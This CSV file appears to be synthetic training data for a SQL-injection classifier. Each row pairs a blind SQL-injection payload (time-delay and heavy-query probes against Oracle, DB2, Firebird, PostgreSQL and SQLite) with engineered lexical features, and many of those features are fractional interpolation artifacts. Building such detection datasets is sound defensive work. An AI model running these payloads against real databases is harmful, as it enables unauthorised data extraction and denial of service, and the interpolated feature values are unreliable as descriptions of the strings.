id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000209,0.6441108079241066,133.70318755459482,32.70318755459481,3.6663503270108975,36.0,16.0,56.0,25.703187554594813,0.26925627022974896,0.119669453435444,0.418843087024054,0.19223118931075298,0.703187554594811,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,12.0,0.0,2.0,1.0,9.0,0.7031875545948111,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000002,attack,boolean,"1""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000174,0.660896676585446,134.82208351118246,30.0,3.9208754504973986,72.0,8.0,39.13321443815638,15.688869073026064,0.5343520486914579,0.05937244985460643,0.28992391656759936,0.11635158488633641,0.0,1.0,2.0,0.0,1.0,1.0,0.0,5.688869073026064,0.0,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000003,attack,boolean,"1%' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000155,0.4355792124618408,131.46709316944612,30.244515528241017,4.1132833814991825,67.85580434884356,8.122257764120508,37.24451552824102,18.244515528241017,0.5160866372154265,0.06176363835211795,0.28339678068265584,0.1387529437497997,4.0,-1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.1222577641205085,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000004,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000234,0.6466733226876218,134.31439571913938,32.37120856172122,3.7035178577734014,44.257582876557564,15.0,55.37120856172122,19.68560428086061,0.32946363126233935,0.11167960553968542,0.41227947965720496,0.14657728354077026,2.0,3.999999999999999,0.0,1.0,0.0,1.6856042808606102,0.0,10.0,0.0,0.0,1.0,2.68560428086061,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,boolean,"1   )    )    as tbiq where 7159  =  7159 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000129,0.13151765952271244,132.060586136521,35.060586136521,3.8071920291972567,43.0,21.0,53.0,15.060586136521005,0.32560918182556375,0.15901843763574042,0.4013322473663925,0.11404013317230334,0.060586136521003864,-1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,8.0,0.0,1.0,1.0,5.0,0.060586136521003864,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000006,attack,boolean,"1'  )   where 7093  =  7093 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000090,0.7445717254330962,130.0,35.67673080374292,3.8438791357242565,37.0,23.0,52.0,18.0,0.2846153846153846,0.17692307692307693,0.4,0.13846153846153847,2.676730803742921,0.3232691962570786,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.3232691962570787,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,boolean,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000099,0.6016803408174486,141.789843751527,30.63046874541901,3.846078703540531,41.789843751527,24.0,52.0,24.0,0.2947250212342773,0.16926599490377345,0.3667429889581758,0.16926599490377345,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.7898437515269973,0.2101562484730027,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000008,attack,boolean,"1   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000199,0.5955210525193364,136.2742269783453,29.274226978345297,3.869500668210203,72.0,8.0,41.0,15.274226978345297,0.5283520640596361,0.05870578489551511,0.30086714758951494,0.11207500345533387,0.2742269783452964,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.0,0.0,0.0,2.0,4.0,0.2742269783452965,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'leps' like 'leps",nearest_attack_euclidean,R000218,3.032567200983627,133.30219341592226,28.899268861359246,3.7344058119083363,51.20146227728151,14.0,50.100731138640754,18.0,0.38395829291099576,0.10507744865255025,0.3758646815974608,0.13509957683899318,1.651096707961128,1.3489032920388717,0.0,0.0,0.0,0.44963443067962394,0.0,10.550365569320377,0.0,1.0,3.0,0.44963443067962405,0.5503655693203761,0.44963443067962394,0.0,0.0,0.0,0.44963443067962394,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000010,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.8529434820821613,135.2008475442973,30.628813584084945,4.108532928834197,74.51525433633978,4.0,39.0,17.685593207957528,0.550809226828345,0.02960239580143989,0.28862335906403896,0.13096501830617613,3.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.0,0.6855932079575282,0.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000011,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and '%'  =  '",nearest_attack_euclidean,R000025,0.4656158841787455,135.55268363416081,35.0,3.9534865752778514,51.0,10.0,49.44214690732865,25.110536726832162,0.37628640924115336,0.07378164887081438,0.36468827166219514,0.1852436702258371,2.6683898195035156,0.331610180496484,0.0,0.0,0.0,1.0,0.0,10.110536726832162,1.0,2.0,1.0,7.0,0.8894632731678387,0.1105367268321614,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,boolean,"1%' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000289,0.12851083231619,131.41645648394194,33.0,4.298447197752399,72.0,9.0,33.333165187153554,17.08329129678839,0.5479352903657488,0.0684919112957186,0.2535867521074894,0.1299860462310432,1.0,-1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,4.0832912967883885,1.0,0.0,3.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
